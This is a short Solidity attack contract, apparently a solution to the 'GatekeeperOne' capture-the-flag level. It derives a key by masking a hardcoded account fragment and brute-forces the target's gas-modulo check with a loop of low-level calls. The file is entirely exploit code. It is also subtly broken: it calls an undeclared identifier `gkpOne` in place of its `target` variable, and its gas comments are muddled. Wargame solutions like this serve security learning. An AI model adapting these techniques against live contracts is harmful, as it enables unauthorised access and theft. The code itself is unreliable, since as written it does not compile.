// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GatekeeperOne.sol";

contract GatekeeperOneAttack {
    bytes8 txOrigin16 = 0x080069063e886271; // Last 16 digits of your account.
    bytes8 key = txOrigin16 & 0xFFFFFFFF0000FFFF;
    GatekeeperOne public target;

    constructor(address _targetAddress) public {
        target = GatekeeperOne(_targetAddress);
    }

    function attack() public {
        for (uint256 i = 0; i < 120; i++) {
            // Call <enter> funtion with a lower level <call> method,
            // this allows to control the specific amount of gas loop to provide the right amount of gas.
            // i = iterator
            // 150
            // 8191 = modulo
            // 3 = gas cost for <PUSH> opcode
            (bool result, bytes memory data) = address(gkpOne).call{gas: i + 150 + 8191 * 3}(abi.encodeWithSignature("enter(bytes8)", key));
            // If the response is true (modulo = 0), then break, else, continue through the loop.
            if (result) {
                break;
            }
        }
    }
}
